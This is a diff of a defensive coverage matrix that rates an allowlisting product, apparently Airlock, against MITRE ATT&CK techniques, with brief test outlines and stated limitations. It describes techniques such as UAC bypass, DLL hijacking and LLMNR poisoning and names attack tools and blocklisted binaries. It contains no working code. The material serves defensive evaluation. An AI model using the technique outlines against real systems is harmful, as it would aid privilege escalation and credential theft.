+**Test:** 1) UAC bypass via DLL hijack in auto-elevate app -> DLL blocked. 2) fodhelper.exe reg key to unsigned exe -> exe blocked.
 
-**Limitations:** In-memory exploitation not caught. Kernel exploits operating below Airlock not caught.
+**Limitations:** Registry-based bypasses where payload is a trusted binary (cmd.exe) succeed - use blocklist to restrict.
+
+### T1548.002 - Bypass User Account Control
+**Yes** 🟢 | DLL-control + default-deny | Testable: yes
+
+UAC bypass. Various methods: DLL hijacking in auto-elevate apps (DLL must be trusted), mock trusted dirs, fodhelper.exe registry abuse. DLL hijack UAC bypasses caught by DLL control. Registry-based UAC bypasses using trusted auto-elevate binaries: the trusted binary runs, but any untrusted payload it loads is blocked.
+
+**Test:** 1) UAC bypass via DLL hijack in auto-elevate app -> DLL blocked. 2) fodhelper.exe reg key to unsigned exe -> exe blocked. 3) Blocklist common UAC bypass tools.
+
+**Limitations:** Registry-based bypasses where payload is trusted binary (e.g., cmd.exe) succeed. Use blocklist to restrict.
+
+### T1574 - Hijack Execution Flow
+**Yes** 🟢 | DLL-control + default-deny | Testable: yes
+
+Hijack execution flow - DLL control is the primary defense. Untrusted DLLs blocked at load regardless of the hijack vector (search order, sideloading, COR_PROFILER, etc).
+
+**Test:** Place untrusted DLL in trusted app directory -> DLL blocked at load.
+
+**Limitations:** Memory-only hijacks (T1574.013 KernelCallbackTable) operate inside trusted process memory - not caught. Trusted-signed DLLs pass publisher trust.
+
+### T1574.001 - DLL
+**Yes** 🟢 | DLL-control | Testable: yes
+
+DLL search order hijacking. Malicious DLL in app directory. Must be trusted.
+
+**Test:** Unsigned DLL with legitimate name in app dir -> blocked.
+
+**Limitations:** Strongest control against common malware technique.
+
+### T1574.005 - Executable Installer File Permissions Weakness
+**Yes** 🟢 | default-deny | Testable: partial
+
+Executable installer file perms weakness. Replacement must be trusted.
+
+**Test:** Replace installer exe with unsigned -> blocked on service restart.
+
+**Limitations:** File replacement itself is OS permissions issue.
+
+### T1574.007 - Path Interception by PATH Environment Variable
+**Yes** 🟢 | default-deny | Testable: yes
+
+Path interception by PATH env var. Malicious exe in high-priority PATH dir. Must be trusted.
+
+**Test:** Unsigned exe named common_tool.exe in PATH dir -> blocked.
+
+**Limitations:** If placed in path-trusted directory, may run.
+
+### T1574.008 - Path Interception by Search Order Hijacking
+**Yes** 🟢 | default-deny | Testable: yes
+
+Path interception by search order. Same principle as .007.
+
+**Test:** Unsigned exe in directory searched before legitimate -> blocked.
+
+**Limitations:** Path rule coverage important.
+
+### T1574.009 - Path Interception by Unquoted Path
+**Yes** 🟢 | default-deny | Testable: yes
+
+Unquoted path interception. Attacker places exe at shorter path. Must be trusted.
+
+**Test:** Unquoted 'C:\Program Files\App\svc.exe' -> place C:\Program.exe (unsigned) -> blocked.
+
+**Limitations:** Classic technique caught cleanly.
+
+### T1574.010 - Services File Permissions Weakness
+**Yes** 🟢 | default-deny | Testable: partial
+
+Services file perms weakness. Replace service binary. Must be trusted.
+
+**Test:** Replace service binary with unsigned -> restart blocked.
+
+**Limitations:** File replacement is OS perms issue.
+
+### T1574.011 - Services Registry Permissions Weakness
+**Yes** 🟢 | default-deny | Testable: yes
+
+Services registry perms weakness. Modify ImagePath to malicious exe. Must be trusted.
+
+**Test:** Modify service ImagePath to unsigned exe -> start blocked.
+
+**Limitations:** Reg mod not prevented.
+
+### T1574.012 - COR_PROFILER
+**Yes** 🟢 | DLL-control | Testable: yes
+
+COR_PROFILER .NET profiler DLL. Must be trusted.
+
+**Test:** Set COR_PROFILER to untrusted DLL -> blocked when .NET app starts.
+
+**Limitations:** Env var mod not prevented.
+
+### T1574.013 - KernelCallbackTable
+**No** ⚪ | none
+
+KernelCallbackTable. In-memory manipulation of trusted process.
+
+**Test:** N/A - in-memory. EDR territory.
+
+### T1574.014 - AppDomainManager
+**Yes** 🟢 | DLL-control | Testable: yes
+
+AppDomainManager injection. .NET config loads attacker DLL. Must be trusted.
+
+**Test:** Malicious .config pointing to untrusted DLL -> blocked.
+
+**Limitations:** Config file modification not prevented.
 
 ### T1611 - Escape to Host
 **No** ⚪ | none
@@ -926,7 +1807,7 @@ Escape to host from container. Container/VM escape. Not standard Windows endpoin
 **Limitations:** Container security.
 
 
-## DEFENSE-EVASION (165 techniques - 78 covered)
+## DEFENSE-EVASION (165 techniques - 77 covered)
 
 ### T1006 - Direct Volume Access
 **No** ⚪ | none
@@ -1432,6 +2313,23 @@ Indirect command execution via trusted LOLBINs (pcalua.exe, forfiles.exe, etc). 
 
 **Limitations:** Indirect launcher is trusted but payload is still checked at execution.
 
+### T1205 - Traffic Signaling
+**No** ⚪ | none
+
+Traffic signaling / port knocking. Network-level. No file execution.
+
+**Limitations:** Network security.
+
+### T1205.001 - Port Knocking
+**No** ⚪ | none
+
+Port knocking. Network-level.
+
+### T1205.002 - Socket Filters
+**No** ⚪ | none
+
+Socket filters. Kernel-level network manipulation.
+
 ### T1207 - Rogue Domain Controller
 **No** ⚪ | none
 
@@ -1440,13 +2338,11 @@ Rogue domain controller. AD-level attack. Not file execution.
 **Limitations:** AD security.
 
 ### T1211 - Exploitation for Defense Evasion
-**Yes** 🟢 | default-deny | Testable: partial
+**No** ⚪ | default-deny | Testable: partial
 
-Exploit runs inside trusted process. If it drops tools/payloads to disk, those must be trusted.
+Exploitation for defense evasion is about abusing a vulnerability to bypass security controls. The exploit itself runs inside a trusted process. Airlock doesn't detect or prevent exploits.
 
-**Test:** Exploit dropping tool to disk -> tool blocked.
-
-**Limitations:** In-memory exploitation not caught. EDR + exploit protection territory.
+**Limitations:** Exploit prevention, patching, and EDR behavioral detection are the controls.
 
 ### T1216 - System Script Proxy Execution
 **Yes** 🟢 | blocklist + script-control | Testable: yes
@@ -1815,6 +2711,59 @@ Code signing policy modification. Modifying Windows code signing enforcement. Ai
 
 **Limitations:** Airlock operates its own trust model.
 
+### T1556 - Modify Authentication Process
+**No** ⚪ | none (sub-technique dependent)
+
+Modify authentication process. Modifies login/auth mechanisms. Some sub-techniques involve DLL loading.
+
+**Test:** See sub-techniques.
+
+### T1556.001 - Domain Controller Authentication
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Domain controller auth DLL. Password filter loaded by lsass. Must be trusted.
+
+**Test:** Untrusted password filter DLL on DC -> blocked.
+
+**Limitations:** DC/server focused.
+
+### T1556.002 - Password Filter DLL
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Password filter DLL. Loaded by lsass on password change. Must be trusted.
+
+**Test:** Untrusted password filter DLL -> blocked.
+
+**Limitations:** Reg mod not prevented.
+
+### T1556.005 - Reversible Encryption
+**No** ⚪ | none
+
+Reversible encryption. AD policy change. No file execution.
+
+**Limitations:** AD security.
+
+### T1556.006 - Multi-Factor Authentication
+**No** ⚪ | none
+
+MFA interception. Identity plane.
+
+**Limitations:** MFA security.
+
+### T1556.007 - Hybrid Identity
+**No** ⚪ | none
+
+Hybrid identity. Cloud/identity plane.
+
+### T1556.008 - Network Provider DLL
+**Yes** 🟢 | DLL-control | Testable: yes
+
+Network provider DLL. Loaded at logon. Must be trusted.
+
+**Test:** Untrusted network provider DLL -> blocked.
+
+**Limitations:** Reg mod not prevented.
+
 ### T1562 - Impair Defenses
 **Yes** 🟢 | agent-tamper-protection | Testable: yes
 
@@ -2094,7 +3043,7 @@ Delay execution (sleep/timer). If malware is untrusted, blocked whenever it trie
 Selective exclusion. Malware selectively targeting systems. Behavioral.
 
 
-## CREDENTIAL-ACCESS (53 techniques - 14 covered)
+## CREDENTIAL-ACCESS (53 techniques - 13 covered)
 
 ### T1003 - OS Credential Dumping
 **Yes** 🟢 | default-deny + blocklist-metarule + predefined-blocklist | Testable: yes
@@ -2160,6 +3109,43 @@ Standalone capture tools (Wireshark, tcpdump, windump) blocked by default-deny. 
 
 **Limitations:** Network-level captures via other means (port mirroring) outside scope.
 
+### T1056 - Input Capture
+**No** ⚪ | default-deny (tool) | Testable: partial
+
+Keylogger as standalone tool blocked. DLL-based keylogger DLL blocked. But keylogging achievable via trusted process API hooks or in-process techniques.
+
+**Test:** Standalone keylogger exe -> blocked. Keylogger DLL -> blocked.
+
+**Limitations:** In-process keylogging via trusted process not caught. EDR territory.
+
+### T1056.001 - Keylogging
+**No** ⚪ | default-deny + DLL-control | Testable: partial
+
+Standalone keylogger tools/DLLs blocked. But technique achievable with in-process hooks from trusted code.
+
+**Test:** Keylogger exe -> blocked. Keylogger DLL -> blocked.
+
+**Limitations:** In-process API-level keylogging not caught.
+
+### T1056.002 - GUI Input Capture
+**No** ⚪ | none
+
+GUI input capture. Fake dialog boxes from trusted processes. In-process.
+
+### T1056.003 - Web Portal Capture
+**No** ⚪ | none
+
+Web portal capture. Server-side/web-level.
+
+### T1056.004 - Credential API Hooking
+**No** ⚪ | DLL-control | Testable: partial
+
+Credential API hooking DLL must be trusted to load. But hooking achievable from within trusted process.
+
+**Test:** Untrusted hooking DLL -> blocked.
+
+**Limitations:** In-process hooking not caught.
+
 ### T1110 - Brute Force
 **No** ⚪ | none
 
@@ -2202,13 +3188,11 @@ MFA interception. Identity/protocol level.
 Forced authentication. Triggering NTLM auth via UNC paths. No file execution.
 
 ### T1212 - Exploitation for Credential Access
-**Yes** 🟢 | default-deny | Testable: partial
+**No** ⚪ | default-deny | Testable: partial
 
-Exploitation for credential access. Exploit runs inside trusted process. If drops tools, blocked.
+Exploitation for credential access is about abusing a vulnerability to obtain credentials. The exploit itself runs inside a trusted process or against a service. Airlock doesn't detect or prevent exploits.
 
-**Test:** Dropped credential tool -> blocked.
-
-**Limitations:** In-memory exploitation not caught.
+**Limitations:** Exploit prevention, patching, and EDR behavioral detection are the controls.
 
 ### T1539 - Steal Web Session Cookie
 **No** ⚪ | none
@@ -2321,6 +3305,34 @@ Network provider DLL. Loaded at logon. Must be trusted.
 **Test:** Untrusted network provider DLL -> blocked.
 
 **Limitations:** Reg mod not prevented.
+
+### T1557 - Adversary-in-the-Middle
+**Yes** 🟢 | default-deny + script-control + blocklist-metarule | Testable: yes
+
+AitM tools (Responder, Inveigh, ettercap, bettercap) must be trusted. Blocked by default-deny. Inveigh as PS script: restricted by script control + PS blocklist for non-admins.
+
+**Test:** 1) Responder.exe -> blocked (untrusted). 2) Inveigh.ps1 -> blocked by script control. 3) Blocklist PS for non-admins -> prevents Inveigh via PS.
+
+### T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
+**Yes** 🟢 | default-deny + script-control + blocklist-metarule | Testable: yes
+
+LLMNR/NBT-NS poisoning tools blocked by default-deny. Inveigh restricted by script control + PS blocklist.
+
+**Test:** Responder -> blocked. Inveigh.ps1 -> script control. Blocklist PS for non-admins.
+
+### T1557.002 - ARP Cache Poisoning
+**Yes** 🟢 | default-deny | Testable: yes
+
+ARP spoofing tools (arpspoof, ettercap, bettercap) must be trusted. Blocked by default-deny.
+
+**Test:** ARP spoofing tool not allowlisted -> blocked.
+
+**Limitations:** No built-in Windows ARP spoofing capability.
+
+### T1557.003 - DHCP Spoofing
+**No** ⚪ | none
+
+DHCP spoofing. Network-level.
 
 ### T1558 - Steal or Forge Kerberos Tickets
 **No** ⚪ | none
@@ -2446,6 +3458,15 @@ whoami.exe restrictable via blocklist metarule for non-admins.
 **Test:** Blocklist whoami.exe for non-admins.
 
 **Limitations:** Environment variables and PowerShell alternatives available if PS trusted.
+
+### T1040 - Network Sniffing
+**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes
+
+Standalone capture tools (Wireshark, tcpdump, windump) blocked by default-deny. Built-in pktmon.exe restrictable via blocklist metarule.
+
+**Test:** 1) Wireshark not allowlisted -> blocked. 2) Blocklist pktmon.exe for non-admins.
+
+**Limitations:** Network-level captures via other means (port mirroring) outside scope.
 
 ### T1046 - Network Service Discovery
 **Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes
@@ -2579,6 +3600,32 @@ nltest.exe and dsquery.exe: restrict via blocklist metarule for non-admins.
 
 **Limitations:** PowerShell Get-ADTrust available if PS trusted.
 
+### T1497 - Virtualization/Sandbox Evasion
+**No** ⚪ | default-deny (indirect) | Testable: yes
+
+VM/sandbox evasion checks. If malware is untrusted, blocked before it can check.
+
+### T1497.001 - System Checks
+**No** ⚪ | default-deny (indirect) | Testable: yes
+
+System checks. Same.
+
+**Test:** Same.
+
+### T1497.002 - User Activity Based Checks
+**No** ⚪ | default-deny (indirect) | Testable: yes
+
+User activity checks. Same.
+
+**Test:** Same.
+
+### T1497.003 - Time Based Checks
+**No** ⚪ | default-deny (indirect) | Testable: yes
+
+Time based checks. Same.
+
+**Test:** Same.
+
 ### T1518 - Software Discovery
 **No** ⚪ | none
 
@@ -2611,6 +3658,11 @@ gpresult.exe restrictable via blocklist metarule for non-admins.
 
 **Test:** Blocklist gpresult.exe for non-admins.
 
+### T1622 - Debugger Evasion
+**No** ⚪ | default-deny (indirect) | Testable: yes
+
+Debugger evasion. If malware untrusted, blocked before check.
+
 ### T1652 - Device Driver Discovery
 **No** ⚪ | none
 
@@ -2632,7 +3684,7 @@ Virtual machine discovery. Checking VM indicators. Behavioral.
 Local storage discovery. Enumerating storage. Data operation.
 
 
-## LATERAL-MOVEMENT (17 techniques - 12 covered)
+## LATERAL-MOVEMENT (17 techniques - 10 covered)
 
 ### T1021 - Remote Services
 **Yes** 🟢 | default-deny (on target) | Testable: yes
@@ -2644,13 +3696,11 @@ Remote access to target. Post-access, any untrusted tools attacker tries to run 
 **Limitations:** Access mechanism itself not prevented. Airlock's value is enforcement on the target.
 
 ### T1021.001 - Remote Desktop Protocol
-**Yes** 🟢 | none (post-access controlled) | Testable: partial
+**No** ⚪ | none
 
-RDP provides access. Post-access, any untrusted tool attacker runs is blocked by Airlock on target.
+RDP is a built-in Windows feature. Airlock doesn't prevent or control RDP access. Post-access, Airlock enforces on any tools the attacker runs on the target, but that's default-deny working normally, not a specific control for RDP.
 
-**Test:** RDP to target -> attempt to run unsigned tool -> blocked.
-
-**Limitations:** RDP access itself not prevented. Airlock's value is execution control post-access.
+**Limitations:** RDP access control is handled by network segmentation, firewall rules, and identity/MFA. Airlock's value post-RDP is execution control on the target endpoint.
 
 ### T1021.002 - SMB/Windows Admin Shares
 **Yes** 🟢 | default-deny + blocklist | Testable: yes
@@ -2688,6 +3738,15 @@ WinRM commands execute on remote target. Any binary/script the command invokes m
 
 **Limitations:** Inline PS commands via WinRM on trusted PS succeed. Execution of untrusted files is blocked.
 
+### T1072 - Software Deployment Tools
+**Yes** 🟢 | default-deny | Testable: partial
+
+Deployment tools (SCCM, PDQ) are trusted. If compromised to push malicious payloads, payload must still pass default-deny on target endpoint. Untrusted binary blocked at execution regardless of delivery method.
+
+**Test:** Push unsigned exe via SCCM to endpoint -> deployed successfully, blocked at execution.
+
+**Limitations:** If deployment tool configured as trusted parent process, audit process trust rules carefully. Payloads signed by trusted publisher pass publisher trust.
+
 ### T1080 - Taint Shared Content
 **Yes** 🟢 | default-deny + script-control | Testable: yes
 
@@ -2697,14 +3756,21 @@ Taint shared content. Placing malicious files on network shares. When victim exe
 
 **Limitations:** File placement not prevented. Execution on victim blocked.
 
+### T1091 - Replication Through Removable Media
+**Yes** 🟢 | default-deny + script-control | Testable: yes
+
+Replication through removable media. Malware on USB must be trusted to execute. Autorun payloads blocked.
+
+**Test:** Insert USB with unsigned exe, attempt to run -> blocked. Autorun pointing to untrusted payload -> blocked.
+
+**Limitations:** USB device insertion not prevented. Only execution of untrusted files.
+
 ### T1210 - Exploitation of Remote Services
-**Yes** 🟢 | default-deny (on target) | Testable: partial
+**No** ⚪ | default-deny (on target) | Testable: partial
 
-Exploitation of remote services. Exploit on remote target. Post-exploitation tools must be trusted on target.
+Exploitation of remote services is about abusing a vulnerability in a remote service (e.g., SMB, RDP, SQL). The exploit targets the service itself. Airlock doesn't prevent exploits. Post-exploitation tool deployment on the target is covered under execution techniques.
 
-**Test:** Exploit drops tool on target -> blocked.
-
-**Limitations:** In-memory exploitation not caught.
+**Limitations:** Patching, network segmentation, and EDR are the controls.
 
 ### T1534 - Internal Spearphishing
 **Yes** 🟢 | default-deny + script-control | Testable: yes
@@ -2714,6 +3780,25 @@ Internal spearphishing. Phishing from compromised internal account. Payload must
 **Test:** Internal phishing email with malicious attachment -> blocked on victim.
 
 **Limitations:** Email delivery not prevented.
+
+### T1550 - Use Alternate Authentication Material
+**No** ⚪ | none
+
+Use alternate auth material (parent). Credential reuse. Identity plane.
+
+**Limitations:** Post-auth, tools attacker runs are checked.
+
+### T1550.002 - Pass the Hash
+**No** ⚪ | none
+
+Pass the hash. Credential technique. No new file execution required if using trusted tools.
+
+**Limitations:** If PtH tool (mimikatz) is untrusted, tool itself blocked.
+
+### T1550.003 - Pass the Ticket
+**No** ⚪ | none
+
+Pass the ticket. Same as PtH.
 
 ### T1563 - Remote Service Session Hijacking
 **No** ⚪ | none
